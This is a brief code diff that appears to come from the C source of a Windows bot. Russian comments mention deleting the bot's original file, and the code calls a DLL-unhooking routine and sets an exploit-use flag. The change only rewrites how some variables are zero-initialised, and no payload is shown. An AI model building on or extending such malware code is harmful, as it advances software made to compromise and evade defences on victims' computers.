@@ -75,8 +75,8 @@ char TARGET_PLATFORM[] = "target-xp";
 char SVC_FUCKUP_ENABLED[] = "0";
 #endif
 
-CHAR PathBkFile[ MAX_PATH ] = {0}; 
-CHAR FileToDelete[ MAX_PATH ] = {0}; //путь для удаления первоначального файла бота
+CHAR PathBkFile[MAX_PATH]; 
+CHAR FileToDelete[MAX_PATH]; //путь для удаления первоначального файла бота
 
 
 // Влияет на то, будет ли вызван ExitProcess для
@@ -458,7 +458,9 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 	BOOL bRun = TRUE;
 	BOOL bRet = FALSE;
 	BOOL IsUsedExploit = FALSE;
-	OSVERSIONINFOEXA OSVer = {sizeof(OSVer), 0};
+	OSVERSIONINFOEXA OSVer;
+	m_memset( &OSVer, 0, sizeof(OSVer) );
+	OSVer.dwOSVersionInfoSize = sizeof(OSVer) ;
 
 	UnhookDlls();
 
